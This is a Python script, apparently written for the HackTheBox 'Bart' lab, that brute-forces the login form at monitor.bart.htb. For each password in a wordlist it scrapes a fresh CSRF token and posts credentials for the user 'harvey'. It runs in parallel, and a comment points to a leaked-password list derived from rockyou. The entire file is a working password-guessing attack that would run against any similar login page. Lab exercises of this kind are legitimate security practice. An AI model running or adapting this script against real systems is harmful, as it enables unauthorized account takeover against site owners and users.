#!/usr/bin/python3

import re, requests, sys, signal
from multiprocessing import Pool
from argparse import ArgumentParser
from bs4 import BeautifulSoup
from pwn import *

def exit_handler(sig, frame):
	print("\n[!] Saliendo de la aplicacion...")
	sys.exit(1)
	
#evento para controlar la salida de la aplicacion con Ctrl+C
signal.signal(signal.SIGINT, exit_handler)

url = "http://monitor.bart.htb/index.php"

def brute_force_attack(password):
    try:
        with requests.Session() as s:
            r = s.get(url)
            r.raise_for_status()  # Verifica si la solicitud GET fue exitosa
            
			#csrf_re = 'name="csrf" value="(.*)"'
			#csrf = re.findall(csrf_re, r.text)[0]
            soup = BeautifulSoup(r.text, 'html.parser')
            csrf = soup.find('input', {'name': 'csrf'})['value']
            
            post_login = {
                "csrf": csrf,
                "user_name": "harvey",
                "user_password": password,
                "action": "login"
            }
            r = s.post(url, data=post_login)
            r.raise_for_status()  # Verifica si la solicitud POST fue exitosa
            if "The information is incorrect" in r.text:
                return password, False
            else:
                return password, True
    except requests.exceptions.RequestException as req_err:
        print(f"Error en la solicitud HTTP: {req_err}")
        return password, False
    except AttributeError as attr_err:
        print(f"Error al extraer el token CSRF: {attr_err}")
        return password, False
    except Exception as e:
        print(f"Error inesperado: {e}")
        return password, False
        
def main(wordlist,hilos):
    try:
        with open(wordlist, 'r', encoding='latin-1') as file:
            try:
                with Pool(processes=int(hilos)) as pool:
                    progress_pass = log.progress("[+] Buscando credenciales...")
                    for password, status in pool.imap_unordered(brute_force_attack, (line.strip() for line in file)):
                        if status:
                            print(f"\n[+] Found password: {password} \n")
                            pool.terminate()
                            sys.exit(0)
                        else:
                            progress_pass.status(password)
                print("Not found")
            except (OSError, IOError) as file_err:
                print(f"Error al leer el archivo de la lista de contraseñas: {file_err}")
            except Exception as proc_err:
                print(f"Error durante el procesamiento: {proc_err}")
    except FileNotFoundError as fnf_err:
        print(f"Archivo no encontrado: {fnf_err}")
    except PermissionError as perm_err:
        print(f"Permiso denegado al intentar leer el archivo: {perm_err}")
    except Exception as e:
        print(f"Error inesperado: {e}")
    
if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument("-t", "--threads", help="Hilos de la aplicacion", default=10)
    parser.add_argument("-w", "--wordlist", help="diccionario de password", required=True)
    args = parser.parse_args()
    
    main(args.wordlist,args.threads)
    #/usr/share/seclists/Passwords/Leaked-Databases/rockyou-55.txt
